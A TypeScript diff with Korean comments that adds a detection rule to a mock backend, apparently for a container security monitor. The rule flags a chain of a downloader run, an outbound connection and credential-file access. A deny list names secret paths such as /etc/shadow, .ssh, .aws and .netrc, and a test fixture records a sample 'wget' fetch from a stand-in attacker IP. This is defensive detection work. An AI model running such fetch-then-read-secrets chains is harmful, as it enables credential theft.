@@ -23,6 +23,7 @@ import type {
   Proposal,
   ProposalChange,
   Rule,
+  SequenceHit,
   Stats,
   Summary,
   Timeline,
@@ -76,6 +77,61 @@ export function dnsRules(): Rule[] {
       maxLabelLength: 40,
     },
   ];
+}
+// ── 11/04 연쇄 규칙(kind: sequence) — backend policies/default.yaml chain-download-secrets · model.SequenceHit ──
+export const SEQ_RULE_ID = 'chain-download-secrets';
+export const SEQ_PATHS = ['/etc/shadow', '/root/.ssh/', '/home/*/.ssh/*', '/root/.aws/', '/var/run/secrets/', '/run/secrets/', '/root/.netrc', '/root/.git-credentials', '/root/.docker/config.json', '/root/.kube/config'];
+export function sequenceRule(): Rule {
+  return {
+    id: SEQ_RULE_ID,
+    description: '같은 컨테이너에서 10초 안에 다운로더 실행 → 외부 연결 → 자격 증명 파일 접근(하나씩은 약한 신호라도 이어지면 유출 시도). sg-vm 실측 전까지 시험 운영',
+    kind: 'sequence',
+    action: 'kill',
+    dryRun: true,
+    windowSeconds: 10,
+    steps: [
+      { kind: 'exec', denyComms: ['curl', 'wget'] },
+      { kind: 'connect', allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] },
+      { kind: 'open', denyPaths: [...SEQ_PATHS] },
+    ],
+  };
+}
+// 완성된 연쇄(엔진 Observe) — exec wget(t0) → connect 203.0.113.7:80(+2.1초) → open /root/.netrc(+2.4초)
+export function sequenceHit(t0: number, o: { dryRun?: boolean; path?: string } = {}): SequenceHit {
+  const at = (ms: number) => new Date(t0 + ms).toISOString();
+  return {
+    ruleId: SEQ_RULE_ID,
+    action: 'kill',
+    ...(o.dryRun === false ? {} : { dryRun: true }),
+    steps: [
+      { kind: 'exec', timestamp: at(0), comm: 'wget', pid: 4301, detail: 'wget -q http://203.0.113.7/x' },
+      { kind: 'connect', timestamp: at(2100), comm: 'wget', pid: 4301, detail: '203.0.113.7:80' },
+      { kind: 'open', timestamp: at(2400), comm: 'python3', pid: 4302, detail: o.path ?? '/root/.netrc' },
+    ],
+  };
+}
+// backend rules.Rule.Validate 의 연쇄 검사(V2~V8) 문구 — 저장(POST /api/policies) 422 재현용(첫 오류들만 줄바꿈으로, errors.Join 과 같은 모양)
+const COND_KEYS = ['denyComms', 'denyArgs', 'denyPaths', 'allowPaths', 'allowPorts', 'allowCidrs', 'denyPorts', 'denyCidrs', 'allowHosts', 'denyHosts', 'denyQtypes', 'directIp', 'maxNameLength', 'maxLabelLength'];
+const hasCond = (r: Record<string, unknown>) => COND_KEYS.some((k) => { const v = r[k]; return Array.isArray(v) ? v.length > 0 : v !== undefined && v !== '' && v !== 0; });
+export function validateSequence(r: Rule): string[] {
+  const errs: string[] = [];
+  if (r.kind !== 'sequence') {
+    if (r.steps?.length || r.windowSeconds) errs.push('steps · windowSeconds 는 sequence 규칙에서만');
+    return errs;
+  }
+  const n = r.steps?.length ?? 0;
+  if (n < 2 || n > 5) errs.push(`steps: 단계 2~5개 (지금 ${n}개)`);
+  const w = r.windowSeconds ?? 0;
+  if (w < 1 || w > 60) errs.push(`windowSeconds ${w}: 1~60`);
+  if (hasCond(r as unknown as Record<string, unknown>)) errs.push('sequence 규칙 최상위에는 조건을 쓸 수 없음 — 조건은 steps 에');
+  (r.steps ?? []).forEach((st, i) => {
+    const s = st as unknown as Record<string, unknown>;
+    if (!['exec', 'open', 'connect', 'dns'].includes(String(s.kind))) return void errs.push(`steps[${i}]: kind ${JSON.stringify(s.kind ?? '')}: exec | open | connect | dns`);
+    if (['id', 'description', 'action', 'dryRun', 'disabled', 'containers', 'steps', 'windowSeconds'].some((k) => s[k] !== undefined))
+      errs.push(`steps[${i}]: 단계에는 kind 와 조건만 — id · description · action · dryRun · disabled · containers · steps · windowSeconds 는 쓸 수 없음`);
+    if (!hasCond(s)) errs.push(`steps[${i}]: ${String(s.kind)} 규칙에 조건이 없음`);
+  });
+  return errs;
 }
 // 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현)
 export const TL = { matchMs: 12, evidenceStartMs: 15, evidenceDoneMs: 310, killMs: 420, notifyMs: 431 };
@@ -436,6 +492,34 @@ export class MockBackend {
     this.demo.enabled = true;
     return this;
   }
+  // 11/04: 연쇄 규칙 chain-download-secrets(sandbox-dns 가 있으면 그 뒤, 없으면 시스템 규칙 앞) + 연쇄가 이긴 감사 1행(web-api · 격리 대상 · 건 없음)
+  // + 최근 판정 2건(연쇄가 이긴 판정 · 단일 규칙 sensitive-files 가 이기고 연쇄는 주석인 판정)
+  enableSequence() {
+    const now = this.now;
+    const dns = this.rules.findIndex((r) => r.id === 'sandbox-dns');
+    this.rules.splice(dns >= 0 ? dns + 1 : this.rules.findIndex((r) => r.id === 'blocklist-hosts'), 0, sequenceRule());
+    const WEB = 'web-api';
+    const WIMG = 'demo/web-api:2.3';
+    const t0 = now - 40_000;
+    const won: Verdict = {
+      event: { ...ev(now, 40 - 2.4, WEB, WIMG, { kind: 'open', comm: 'python3', path: '/root/.netrc' }), pid: 4302 },
+      matched: true,
+      ruleId: SEQ_RULE_ID,
+      action: 'kill',
+      dryRun: true,
+      reason: '연쇄 3단계(10초 안): exec wget → connect 203.0.113.7:80 → open /root/.netrc · 2.4초',
+      sequence: sequenceHit(t0),
+    };
+    const t1 = now - 20_000;
+    const note: Verdict = {
+      ...kill({ ...ev(now, 20 - 2.4, WEB, WIMG, { kind: 'open', comm: 'python3', path: '/root/.ssh/id_rsa' }), pid: 4302 }, 'sensitive-files', '금지 경로 /root/.ssh/ 접근'),
+      sequence: sequenceHit(t1, { path: '/root/.ssh/id_rsa' }),
+    };
+    this.recent.unshift(note, won);
+    const top = Math.max(0, ...this.audit.map((a) => a.id));
+    this.audit.unshift({ ...won, id: top + 1, caseId: null, install: null });
+    return this;
+  }
   // 시연 모의 재생(계약 §2 mock 소스): 세션 → 정상 이벤트 → 시나리오 이벤트 순서대로, 첫 kill 판정에서 멈춘다
   private startDemo(run: DemoRun) {
     const ctr = run.container;
@@ -668,6 +752,9 @@ export class MockBackend {
     }
     if (method === 'POST' && path === '/policies') {
       const r = JSON.parse(body ?? '{}') as Rule;
+      // 11/04: 연쇄 규칙 검사(backend rules.Rule.Validate 422 문구)
+      const bad = validateSequence(r);
+      if (bad.length) return fail(422, bad.join('\n'));
       const i = this.rules.findIndex((x) => x.id === r.id);
       if (i >= 0) this.rules[i] = r;
       else this.rules.push(r);
